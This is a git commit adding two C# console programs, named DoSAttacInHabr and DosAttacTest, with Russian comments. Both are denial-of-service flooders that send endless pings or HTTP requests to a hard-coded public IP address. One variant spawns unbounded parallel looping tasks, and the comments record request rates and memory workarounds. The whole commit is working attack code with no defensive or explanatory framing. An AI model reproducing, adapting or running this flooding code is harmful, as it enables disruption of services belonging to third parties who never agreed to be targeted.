fccb7f22d77323a9bf9d3711bec5c6a4a20286ef
WAVE <torrent_den2018@mail.ru>
2023-02-17 22:40:21 +0300

    Добавьте файлы проекта.

---
+++ DoSAttacInHabr/Program.cs
@@ -0,0 +1,57 @@
+﻿using System.Net.NetworkInformation;
+using System.Net;
+
+namespace DoSAttacInHabr
+{
+    internal class Program
+    {
+        static int i;
+        static void Main(string[] args)
+        {
+            a1(true);
+        }
+        static void a1(bool IsIP)
+        {
+            IPAddress ip = null;
+            if (IsIP)
+                //Если это атака IP, то парсим строку в textBox2
+                ip = IPAddress.Parse("95.52.117.148");
+            //Основной цикл
+            RequestsPerMinute();
+            while (true)
+            {
+                //Если это атака сайта:
+                if (!IsIP)
+                {
+                    //Создаём запрос
+                    var r = (HttpWebRequest)WebRequest.Create("http://" + ip);
+                    //Начинаем слушать ответ
+                    r.BeginGetResponse(new AsyncCallback((IAsyncResult res) => { }), null);
+                }
+                //Если это атака IP
+                else
+                {
+                    var ping = new Ping();
+                    //Если IP пропарсился нормально, то пингуем
+                    if (ip != null)
+                    {
+                        ping.Send(ip);
+                        //Console.WriteLine(i + " Requests");
+                    }
+                }
+                //Переменная, которая содержит общее количество запросов
+                i++;
+                //Каждые 10000 раз вызываем сборщик мусора, иначе прога будет через минуту своей работы занимать около гигабайта ОЗУ
+                if (i % 10000 == 0)
+                    GC.Collect();
+            }
+        }
+
+        static async Task RequestsPerMinute()
+        {
+            await Task.Delay(60000);
+            Console.WriteLine(i); //37202
+            Console.ReadKey();
+        }
+    }
+}
---
+++ DosAttacTest/Program.cs
@@ -0,0 +1,77 @@
+﻿using System.Net.NetworkInformation;
+using System.Net;
+using System.Windows;
+
+namespace DosAttacTest
+{
+    internal class Program
+    {
+        static int i = 0;
+        static void Main(string[] args)
+        {
+            DoSMethod(true, "95.52.117.148");
+        }
+
+        static void DoSMethod(bool IsIP, string da)
+        {
+            
+            IPAddress ip = null;
+            Action mainTask = null;
+            if (IsIP)
+            {
+                ip = IPAddress.Parse(da);
+                mainTask = new Action(async ()=> await DesktopIp(ip));
+            }
+            mainTask ??= new Action(async () => await SiteIpDos(ip));
+
+
+            RequestsPerMinut();
+            while (true)
+            {
+                mainTask();
+                i++;
+                //Каждые 10000 раз вызываем сборщик мусора, иначе прога будет через минуту своей работы занимать около гигабайта ОЗУ
+                if (i % 10000 == 0)
+                    Console.WriteLine("10000 requests");
+                    GC.Collect();
+            }
+        }
+
+        private static async Task DesktopIp(IPAddress ip)
+        {
+            await Task.Run(() =>
+            {
+                while (true)
+                {
+                    var ping = new Ping();
+
+                    if (ip != null)
+                    {
+                        ping.Send(ip);
+                        //Console.WriteLine($"{i} Requests");
+                    }
+                }
+            });
+        }
+
+        private static async Task SiteIpDos(IPAddress ip)
+        {
+            await Task.Run(() =>
+            {
+                while (true)
+                {
+                    var r = (HttpWebRequest)WebRequest.Create("http://" + ip);
+                    
+                    r.BeginGetResponse(new AsyncCallback((IAsyncResult res) => { }), null);
+                }
+            });
+        }
+
+        private static async Task RequestsPerMinut()
+        {
+            await Task.Delay(60000);
+            Console.WriteLine(i); /*5775*/
+            Console.ReadKey();
+        }
+    }
+}
